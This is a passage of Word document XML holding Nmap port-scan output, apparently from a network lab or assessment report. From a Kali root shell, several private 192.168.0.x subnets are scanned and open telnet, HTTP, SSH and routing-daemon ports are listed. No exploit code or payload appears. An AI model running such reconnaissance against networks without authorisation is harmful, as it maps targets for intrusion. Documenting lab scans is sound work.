        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-01 16:41 EST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47F3A032" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.229</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6855820B" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.0020s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="336ABEB5" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 997 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2122F003" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>PORT    STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="545E56CA" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>23/tcp  open  telnet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="423469F6" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>80/tcp  open  http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FD1CF64" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>443/tcp open  https</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F0E250A" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CAFD842" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.230</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41083DD5" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.0027s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7438F6C2" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 997 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="485F5D46" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT    STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D8A1662" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>23/tcp  open  telnet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="058959D0" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>80/tcp  open  http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01473A7C" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>443/tcp open  https</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="249B6A2F" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79455D52" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap done: 4 IP addresses (2 hosts up) scanned in 14.41 seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="751A0CBB" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>root@kali:~# nmap 192.168.0.232/30</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="036766C9" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-01 16:42 EST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30DEE272" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.233</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71A1F672" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.0029s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D7854BE" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 997 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C57FB6E" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT    STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16556EEC" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>23/tcp  open  telnet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="668D23E8" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>80/tcp  open  http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FA762C2" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>443/tcp open  https</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63848065" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D3E8D50" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.234</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13C0221D" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.0036s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CE96350" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 995 filtered ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3093D76B" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT     STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32BBF82B" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>53/tcp   open  domain</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="702C4A5B" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>80/tcp   open  http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E2D82DC" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>2601/tcp open  zebra</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63023139" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>2604/tcp open  ospfd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="662748EC" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>2605/tcp open  bgpd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C25712F" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1373DDB0" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap done: 4 IP addresses (2 hosts up) scanned in 18.80 seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F0C5299" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>root@kali:~# nmap 192.168.0.240/30</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76C9911E" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-01 16:42 EST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD12E6D" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.241</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CEECF42" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.0028s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0091F1A5" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 995 filtered ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79EFF22C" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT     STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="052A7AC6" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>53/tcp   open  domain</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49B4B574" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>80/tcp   open  http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34A1ED78" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>2601/tcp open  zebra</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="431FF5A0" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>2604/tcp open  ospfd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C1EDD95" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>2605/tcp open  bgpd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07276A89" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E2EAF3D" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.242</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="300563BE" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.0092s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59D04CC9" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 997 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="271E8FEA" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT    STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A83D621" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>22/tcp  open  ssh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBA8CD4" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>80/tcp  open  http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B95684" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>111/tcp open  rpcbind</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5238D3F4" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="692814D9" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap done: 4 IP addresses (2 hosts up) scanned in 18.71 seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B4C789" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>root@kali:~# nmap 192.168.0.32/27</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F57B287" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-01 16:43 EST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7268C420" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Nmap scan report for 192.168.0.33</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3838ECB9" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.0016s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ADE3AAA" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 997 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A7D7435" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT    STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DFF72F" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>23/tcp  open  telnet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="201AAF6D" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>80/tcp  open  http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC8AB0F" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>443/tcp open  https</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F573CB6" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10C0D8ED" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.34</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="514EC886" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.0021s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="566FA102" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 997 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1380ABE3" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
